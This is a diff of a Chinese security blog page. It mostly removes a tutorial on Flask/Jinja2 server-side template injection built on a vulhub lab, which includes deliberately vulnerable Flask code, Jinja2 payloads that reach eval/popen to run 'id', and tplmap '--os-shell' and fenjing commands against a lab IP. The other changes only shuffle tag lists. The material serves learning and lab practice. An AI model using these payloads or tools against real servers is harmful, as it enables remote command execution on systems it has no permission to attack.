@@ -363,72 +363,7 @@
   <div class="article-entry" itemprop="articleBody">
  
 
-	
-		<h3 id="flask基础学习"><a href="#flask基础学习" class="headerlink" title="flask基础学习"></a>flask基础学习</h3><p>flask是用来搭建轻量级的web应用框架，能够快速部署和搭建web框架</p>
-<h4 id="hello-world"><a href="#hello-world" class="headerlink" title="hello world"></a>hello world</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;hello world&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
-
-<p>代码分析：其中@app.route是路由，当你要访问这个搭建的这个web框架的时候，路由里面的路径就是你访问的目录，而这个路由下面的函数就是该目录下呈现的内容</p>
-<p><img src="/Flask/1.png"></p>
-<p>可以看到但我们访问端口5000是就会打印出hello world</p>
-<h4 id="渲染模块"><a href="#渲染模块" class="headerlink" title="渲染模块"></a>渲染模块</h4><p>flask使用的渲染引擎是Jinja2，我们可以导入对应模块将字符串渲染成html代码，从而在web页面呈现出来</p>
-<h5 id="render-template-string"><a href="#render-template-string" class="headerlink" title="render_template_string"></a>render_template_string</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,request,render_template_string</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    html=<span class="string">&#x27;&lt;html&gt;&#123;&#123;var&#125;&#125;&lt;html&gt;&#x27;</span></span><br><span class="line">    test = request.args.get(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html,var=test)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/Flask/2.png"></p>
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>进入vulnhub目录下的flask，使用下面的命令部署环境</p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">docker-compose</span> <span class="selector-tag">up</span> <span class="selector-tag">-d</span></span><br></pre></td></tr></table></figure>
-
-<p>部署完成后使用docker ps查看，一般都是在端口8000下面</p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(<span class="selector-tag">root</span>㉿<span class="selector-tag">kali</span>)<span class="selector-tag">-</span><span class="selector-attr">[~/Desktop/vulhub-master/flask/ssti]</span></span><br><span class="line">└─# <span class="selector-tag">docker</span> <span class="selector-tag">ps</span>            </span><br><span class="line"><span class="selector-tag">CONTAINER</span> <span class="selector-tag">ID</span>   <span class="selector-tag">IMAGE</span>                                                   <span class="selector-tag">COMMAND</span>                  <span class="selector-tag">CREATED</span>         <span class="selector-tag">STATUS</span>          <span class="selector-tag">PORTS</span>                                       <span class="selector-tag">NAMES</span></span><br><span class="line"><span class="number">99</span><span class="selector-tag">deaa07ede4</span>   <span class="selector-tag">vulhub</span>/<span class="selector-tag">flask</span>:<span class="number">1.1</span><span class="selector-class">.1</span>                                      &quot;/<span class="selector-tag">bin</span>/<span class="selector-tag">sh</span> <span class="selector-tag">-c</span> &#x27;<span class="selector-tag">gunicor</span>…&quot;   <span class="number">8</span> <span class="selector-tag">minutes</span> <span class="selector-tag">ago</span>   <span class="selector-tag">Up</span> <span class="number">8</span> <span class="selector-tag">minutes</span>    <span class="number">0.0</span><span class="selector-class">.0</span><span class="selector-class">.0</span>:<span class="number">8000</span><span class="selector-tag">-</span>&gt;<span class="number">8000</span>/<span class="selector-tag">tcp</span>, :::<span class="number">8000</span><span class="selector-tag">-</span>&gt;<span class="number">8000</span>/<span class="selector-tag">tcp</span>   <span class="selector-tag">ssti_web_1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>访问网站出现下图就表示成功</p>
-<p><img src="/Flask/3.png"></p>
-<h3 id="分析利用"><a href="#分析利用" class="headerlink" title="分析利用"></a>分析利用</h3><h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>在flask目录下有一个src目录，里面放的就是源码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    t = Template(<span class="string">&quot;Hello &quot;</span> + name)</span><br><span class="line">    <span class="keyword">return</span> t.render()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run() </span><br></pre></td></tr></table></figure>
-
-<p>利用flask搭建的一个web轻量级框架，其中在根目录下面要求我们输入一个name参数，如果我们不输入任何内容的话，默认name等于guest</p>
-<p>比如我们输入?name&#x3D;49</p>
-<p><img src="/Flask/4.png"></p>
-<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><h5 id="手动利用"><a href="#手动利用" class="headerlink" title="手动利用"></a>手动利用</h5><h6 id="官方poc"><a href="#官方poc" class="headerlink" title="官方poc"></a>官方poc</h6><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="selector-tag">for</span> <span class="selector-tag">c</span> <span class="selector-tag">in</span> <span class="selector-attr">[]</span><span class="selector-class">.__class__</span><span class="selector-class">.__base__</span><span class="selector-class">.__subclasses__</span>() %&#125;</span><br><span class="line">&#123;% <span class="selector-tag">if</span> <span class="selector-tag">c</span><span class="selector-class">.__name__</span> == &#x27;<span class="selector-tag">catch_warnings</span>&#x27; %&#125;</span><br><span class="line">  &#123;% <span class="selector-tag">for</span> <span class="selector-tag">b</span> <span class="selector-tag">in</span> <span class="selector-tag">c</span><span class="selector-class">.__init__</span><span class="selector-class">.__globals__</span><span class="selector-class">.values</span>() %&#125;</span><br><span class="line">  &#123;% <span class="selector-tag">if</span> <span class="selector-tag">b</span><span class="selector-class">.__class__</span> == &#123;&#125;<span class="selector-class">.__class__</span> %&#125;</span><br><span class="line">    &#123;% <span class="selector-tag">if</span> &#x27;<span class="selector-tag">eval</span>&#x27; <span class="selector-tag">in</span> <span class="selector-tag">b</span><span class="selector-class">.keys</span>() %&#125;</span><br><span class="line">      &#123;&#123; <span class="selector-tag">b</span><span class="selector-attr">[<span class="string">&#x27;eval&#x27;</span>]</span>(<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% <span class="selector-tag">endif</span> %&#125;</span><br><span class="line">  &#123;% <span class="selector-tag">endif</span> %&#125;</span><br><span class="line">  &#123;% <span class="selector-tag">endfor</span> %&#125;</span><br><span class="line">&#123;% <span class="selector-tag">endif</span> %&#125;</span><br><span class="line">&#123;% <span class="selector-tag">endfor</span> %&#125;</span><br></pre></td></tr></table></figure>
-
-<h6 id="poc分析"><a href="#poc分析" class="headerlink" title="poc分析"></a>poc分析</h6><p>**<code>[].__class__.__base__.__subclasses__()</code>**：</p>
-<ul>
-<li>通过 Python 对象的 <code>__class__</code> 属性获取类，再通过 <code>__base__</code> 获取其父类。<code>__subclasses__()</code> 列出所有子类。</li>
-<li>这是一个常见的 SSTI 技巧，用来遍历所有类，寻找可以用来执行命令的类。</li>
-</ul>
-<p>**<code>if c.__name__ == &#39;catch_warnings&#39;</code>**：</p>
-<ul>
-<li>在子类中寻找 <code>catch_warnings</code> 这个类。这个类与 Python 的警告机制相关，并可以通过它访问全局变量。</li>
-</ul>
-<p>**<code>for b in c.__init__.__globals__.values()</code>**：</p>
-<ul>
-<li>遍历 <code>catch_warnings</code> 类的 <code>__init__</code> 函数的全局变量，试图找到可执行代码的对象。</li>
-</ul>
-<p>**<code>if b.__class__ == &#123;&#125;.__class__</code>**：</p>
-<ul>
-<li>检查是否是字典类型，因为全局命名空间通常是一个字典对象。</li>
-</ul>
-<p>**<code>if &#39;eval&#39; in b.keys()</code>**：</p>
-<ul>
-<li>查找全局命名空间中是否存在 <code>eval</code> 函数，<code>eval</code> 是一个可以执行字符串代码的函数。</li>
-</ul>
-<p>**<code>b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#39;)</code>**：</p>
-<ul>
-<li>通过 <code>eval</code> 函数执行 <code>__import__(&#39;os&#39;).popen(&#39;id&#39;).read()</code>，从而执行 <code>id</code> 命令并返回结果。</li>
-</ul>
-<p><strong>当然不止可以遍历出eval来利用，还可以遍历出popen来利用，不过这里popen没有用</strong></p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="selector-tag">for</span> <span class="selector-tag">c</span> <span class="selector-tag">in</span> <span class="selector-attr">[]</span><span class="selector-class">.__class__</span><span class="selector-class">.__base__</span><span class="selector-class">.__subclasses__</span>() %&#125;</span><br><span class="line">&#123;% <span class="selector-tag">if</span> <span class="selector-tag">c</span><span class="selector-class">.__name__</span> == &#x27;<span class="selector-tag">catch_warnings</span>&#x27; %&#125;</span><br><span class="line">  &#123;% <span class="selector-tag">for</span> <span class="selector-tag">b</span> <span class="selector-tag">in</span> <span class="selector-tag">c</span><span class="selector-class">.__init__</span><span class="selector-class">.__globals__</span><span class="selector-class">.values</span>() %&#125;</span><br><span class="line">  &#123;% <span class="selector-tag">if</span> <span class="selector-tag">b</span><span class="selector-class">.__class__</span> == &#123;&#125;<span class="selector-class">.__class__</span> %&#125;</span><br><span class="line">    &#123;% <span class="selector-tag">if</span> &#x27;<span class="selector-tag">popen</span>&#x27; <span class="selector-tag">in</span> <span class="selector-tag">b</span><span class="selector-class">.keys</span>() %&#125;</span><br><span class="line">      &#123;&#123; <span class="selector-tag">b</span><span class="selector-attr">[<span class="string">&#x27;popen&#x27;</span>]</span>(<span class="string">&#x27;id&#x27;</span>)<span class="selector-class">.read</span>() &#125;&#125;</span><br><span class="line">    &#123;% <span class="selector-tag">endif</span> %&#125;</span><br><span class="line">  &#123;% <span class="selector-tag">endif</span> %&#125;</span><br><span class="line">  &#123;% <span class="selector-tag">endfor</span> %&#125;</span><br><span class="line">&#123;% <span class="selector-tag">endif</span> %&#125;</span><br><span class="line">&#123;% <span class="selector-tag">endfor</span> %&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="工具自动利用"><a href="#工具自动利用" class="headerlink" title="工具自动利用"></a>工具自动利用</h5><p>kali下的<strong>tplmap</strong></p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python2</span> <span class="selector-tag">tplmap</span><span class="selector-class">.py</span> <span class="selector-tag">-u</span> <span class="selector-tag">http</span>:<span class="comment">//192.168.1.196:8000?name= --os-shell</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/Flask/5.png"></p>
-<p>ubuntu下的fenjing</p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python3</span> <span class="selector-tag">-m</span> <span class="selector-tag">fenjing</span> <span class="selector-tag">scan</span> <span class="selector-tag">--url</span> <span class="selector-tag">http</span>:<span class="comment">//192.168.1.196:8000</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/Flask/6.png"></p>
-
+			<h3 id="flask基础学习"><a href="#flask基础学习" class="headerlink" title="flask基础学习"></a>flask基础学习</h3><p>flask是用来搭建轻量级的web应用框架，能够快速部署和搭建web框架</p>
 	
 
 
@@ -1122,6 +1057,17 @@
   <div class="article-info article-info-index">
     
     
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
     
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
@@ -1504,6 +1450,10 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">web</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">--VulnHub靶场</a>
               </li>
              
@@ -1516,7 +1466,7 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">web</a>
+                <a href="javascript:void(0)" class="js-tag color4">XSS</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1533,10 +1483,6 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">SSTI</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">XSS</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1560,11 +1506,11 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
+                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
+                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
               </li>
              
               <li class="article-tag-list-item">
